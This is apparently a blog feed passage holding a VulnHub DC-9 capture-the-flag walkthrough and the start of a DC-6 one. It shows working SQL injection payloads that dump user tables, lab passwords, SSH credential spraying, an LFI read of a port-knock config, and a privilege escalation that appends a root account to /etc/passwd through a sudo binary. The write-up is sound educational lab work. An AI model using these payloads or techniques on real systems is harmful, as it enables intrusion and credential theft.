<li>SQLMap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
<p><code>192.168.2.102</code> is the target.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ arp-scan --interface eth0 192.168.2.0/24 <span class="p">|</span> tee scans/00-arp-scan
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.2.2     0a:00:27:00:00:0a       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH

<span class="m">3</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
Ending arp-scan 1.9.7: <span class="m">256</span> hosts scanned in 1.986 seconds <span class="o">(</span>128.90 hosts/sec<span class="o">)</span>. <span class="m">3</span> responded
</code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span class="s1">&#39;192.168.2.102&#39;</span> -v
<span class="c1"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
Nmap scan report <span class="k">for</span> 192.168.2.102
Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Example.com - Staff Details - Welcome
MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nmap -n -p22 192.168.2.102
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-08 05:21 EDT
Nmap scan report <span class="k">for</span> 192.168.2.102
Host is up <span class="o">(</span>0.00075s latency<span class="o">)</span>.

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nc 192.168.2.102 <span class="m">22</span>
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
</p>
<p>The Display All Records menu functions to display all user records.</p>
<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
</p>
<p>There is a user input on the Search menu</p>
<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
</p>
<p>The Manage menu has login function.</p>
<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
</p>
<p>From here I can assume that the website uses database.</p>
<h4 id="error-based-sql-injection---detection">Error-based SQL injection - Detection</h4>
<p>There&rsquo;s error-based SQL injection on <code>search.php</code>. The initial detection is simple, when I try put <code>'</code> it gives bug (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a> ).</p>
<p>I detected the SQLi vulnerability by adding a single quote  ( <code>'</code> ) at the end of user&rsquo;s first name that I want to search.</p>
<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
</p>
<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
</p>
<p>But then, if I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
</p>
<h4 id="error-based-sql-injection---database-examination">Error-based SQL injection - Database examination</h4>
<p>There are 6 columns available and the data type of each columns is string. The injection query is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,&#39;</span><span class="n">b</span><span class="s1">&#39;,&#39;</span><span class="k">c</span><span class="s1">&#39;,&#39;</span><span class="n">d</span><span class="s1">&#39;,&#39;</span><span class="n">e</span><span class="s1">&#39;,&#39;</span><span class="n">f</span><span class="s1">&#39; -- 
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
</p>
<p>I’ll pull out database version, current database, and the available databases using this query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT @@version, &#39;</span><span class="k">Current</span><span class="w"> </span><span class="n">DB</span><span class="p">:</span><span class="s1">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
</p>
<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into their tables.</p>
<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">Staff</span><span class="s1">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
</p>
<p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p>
<p>So, I’ll get the columns on table <code>Users</code> with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">Users</span><span class="s1">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
</p>
<p>With the following query, I can get the contents of the Username and Password columns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(username, &#39;</span><span class="p">:</span><span class="s1">&#39;, password),2,3,4,5,6 FROM Users -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
</p>
<p>The password is in md5 format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ <span class="nb">echo</span> 856f5de590ef37314e7c3bdf6f8a66dc <span class="p">|</span> wc -c
<span class="m">33</span>
</code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code>, and I’ll just keep that for now.</p>
<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
</p>
<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">users</span><span class="s1">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
</p>
<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">UserDetails</span><span class="s1">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
</p>
<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents with the following query.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
</p>
<p>That&rsquo;s a lot of credentials. I can sort those creds with <code>sed</code> command by substituting comma with new line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ <span class="nb">echo</span> -n <span class="s1">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> <span class="p">|</span> sed -s <span class="s1">&#39;s/,/\n/g&#39;</span>
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC<span class="p">&amp;</span>TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-chandlerb-joeyt-janitor">Shell as chandlerb, joeyt, janitor</h3>
<h4 id="ssh-brute-force">SSH Brute-force</h4>
<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
...&lt;SNIP&gt;...
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> chandlerb:UrAG0D! 
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> joeyt:Passw0rd 
...&lt;SNIP&gt;...
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> janitor:Ilovepeepee 
...&lt;SNIP&gt;...
</code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
<p>I discovered a LFI on the website after inspecting one of its source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">chandlerb@dc-9:/var/www/html$ cat manage.php
</code></pre></div><pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
$file = 'contact-info.php';
$show_errors = $_SESSION['display_errors'];
    if ($show_errors == 'yes') {
        if(file_exists($file)) {
            include($file);
        } else {
            echo &quot;File does not exist&quot; . &quot;&lt;br /&gt;&quot;;
            # LFI vulnerability starts from here
            $file = $_GET['file']; 
            # No input sanitization poc: manage?file=../../../../etc/passwd
            include('directory/' . $file); 
        }
...&lt;SNIP&gt;...
</code></pre><p>Using LFI is the intended way to gain a foothold before performing brute force.</p>
<blockquote>
<p>Log into the website using <code>admin:transorbital1</code>.</p>
</blockquote>
<p>With LFI I can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
</p>
<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">for</span> i in <span class="m">7469</span> <span class="m">8475</span> 9842<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
</p>
<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">for</span> i in <span class="m">9842</span> <span class="m">8475</span> 7469<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
</p>
<p>Then, from here, I should use SSH brute force (which I did earlier).</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-fredf">Shell as fredf</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
</code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
<h4 id="ssh---fredf">SSH - fredf</h4>
<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
...
SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> fredf:B4-Tru3-001 
...
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ ssh fredf@192.168.2.102
fredf@192.168.2.102<span class="err">&#39;</span>s password:
Linux dc-9 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr  <span class="m">8</span> 20:10:42 <span class="m">2021</span> from 192.168.2.103
fredf@dc-9:~$ id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges---arbitrary-file-write">Sudo privileges - Arbitrary file write</h4>
<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/home$ sudo -l
Matching Defaults entries <span class="k">for</span> fredf on dc-9:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User fredf may run the following commands on dc-9:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/devstuff/dist/test/test
</code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/opt/devstuff$ cat test.py 
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">else</span> <span class="p">:</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">else</span> <span class="p">:</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div><p>This can be exploited in many ways, and one of them is to add a new root account to <code>/etc/passwd</code>.</p>
<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>
</code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
<p>Here is what I mean:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># From this</span>
root:x:0:0:root:/root:/bin/bash
<span class="c1"># To</span>
iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
</code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">fredf@dc-9:/tmp$ cat /etc/passwd
...
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</code></pre></div><h4 id="su---root">SU - root</h4>
<p>Now I can switch to my account and get a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ su iamf
Password: pass123
root@dc-9:/tmp#
</code></pre></div><p>And here is the flag,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@dc-9:~# cat theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have <span class="k">done</span> well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the <span class="nb">time</span> to <span class="nb">complete</span> the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-<span class="o">)</span>

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks <span class="k">for</span> all the fish.
</code></pre></div><p>That&rsquo;s all, thanks for reading.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
<li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - DC-6</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>WordPress enumeration and plugin exploitation</li>
<li>Exploiting sudo privilege on nmap</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>WPScan</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ arp-scan --interface eth0 <span class="s1">&#39;192.168.2.0/24&#39;</span> <span class="p">|</span> tee scans/00-arp-scan-dc6
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
192.168.2.2     0a:00:27:00:00:07       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
</code></pre></div><h3 id="nmap">Nmap</h3>
<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span class="s1">&#39;192.168.2.104&#39;</span> -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Did not follow redirect to http://wordy/
<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">192.168.1.104   wordy
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page clearly states that it&rsquo;s a WordPress site.</p>
<p><div class="img-container"><img src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  /></div>
</p>
<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
